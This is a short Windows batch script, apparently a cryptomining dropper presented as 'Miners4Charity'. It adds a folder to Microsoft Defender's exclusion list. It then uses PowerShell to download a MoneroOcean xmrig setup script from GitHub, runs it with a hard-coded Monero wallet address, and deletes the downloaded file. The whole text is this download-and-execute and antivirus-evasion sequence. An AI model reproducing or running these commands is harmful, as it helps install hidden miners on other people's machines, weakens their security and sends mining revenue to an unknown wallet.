rem adding the Mining Directory
mkdir %USERPROFILE%\Miners4Charity
powershell -Command "Defender\Add-MpPreference -ExclusionPath (%USERPROFILE%\Miners4Charity)"

rem running the setup script
powershell -Command "$wc = New-Object System.Net.WebClient; $tempfile = [System.IO.Path]::GetTempFileName(); $tempfile += '.bat'; $wc.DownloadFile('https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.bat', $tempfile); & $tempfile 42uxPgPqt9V9ZpLh8MkZUW2saYJNdrXtXUGtosFGZJdpGHG48Z4i42mHL87oBkkMre9xh1fv9mEnVg1f8ZJnkwqrBDFKNrC; Remove-Item -Force $tempfile"
